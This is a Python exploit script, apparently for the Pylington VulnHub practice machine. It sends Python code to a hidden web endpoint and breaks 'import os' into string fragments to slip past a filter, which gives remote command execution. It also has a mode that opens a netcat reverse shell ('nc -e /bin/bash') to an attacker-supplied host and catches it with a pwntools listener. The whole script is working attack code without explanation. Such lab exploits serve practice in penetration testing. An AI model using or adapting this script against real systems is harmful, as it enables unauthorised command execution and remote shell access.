#!/usr/bin/python3
import requests, argparse, threading, sys
from bs4 import BeautifulSoup
from pwn import listen

parser = argparse.ArgumentParser(description="Exploit for Pylington machine of vulnhub")
parser.add_argument("--reverse", "-r", action="store_true", help="reverse shell")
parser.add_argument("--command", "-c", type=str, help="execute command")
parser.add_argument("--rhost", "-rh", type=str, help="remote host")
parser.add_argument("--lhost", "-lh", type=str, help="local host")
parser.add_argument("--lport", "-lp", type=str, help="local port")
args = parser.parse_args()

if len(sys.argv) < 2:
    parser.print_help()
    sys.exit(1)

if args.reverse:
    if args.lhost and args.lport:
        def cmd():
            target = f"http://{args.rhost}/n8pji3yeaccqvek2uzfc"
            data = {"program": f"str1='imp'+'ort'+' o'+'s;'\r\nstr2='o'+'s.system(\"nc -e /bin/bash {args.lhost} {args.lport}\")'\r\nexec(str1)\r\nexec(str2)", "stdin": ''}
            requests.post(target, data=data)

        threading.Thread(target=cmd, args=()).start()
        shell = listen(args.lport, timeout=60).wait_for_connection()
        shell.sendline(b"export TERM=xterm HOME=/srv/http; cd")
        shell.interactive()
    else:
        print(f"Usage examples: \n    python3 {sys.argv[0]} --reverse --rhost 192.168.0.2 --lhost 192.168.0.1 --lport 443\n    python3 {sys.argv[0]} -r -rh 192.168.0.2 -lh 192.168.0.1 -lp 443")
        sys.exit(1)

if args.command:
    if args.rhost:
        target = f"http://{args.rhost}/n8pji3yeaccqvek2uzfc"
        data = {"program": f"str1='imp'+'ort'+' o'+'s;'\r\nstr2='o'+'s.system(\"{args.command}\")'\r\nexec(str1)\r\nexec(str2)", "stdin": ''}
        request = requests.post(target, data=data)
        parset = BeautifulSoup(request.content, 'html.parser')
        result = parset.find_all("textarea")[2].get_text()
        print(result.strip())
    else:
        print(f"Usage examples: \n    python3 {sys.argv[0]} --rhost 192.168.0.2 --command id\n    python3 {sys.argv[0]} -rh 192.168.0.2 -c id")
        sys.exit(1)
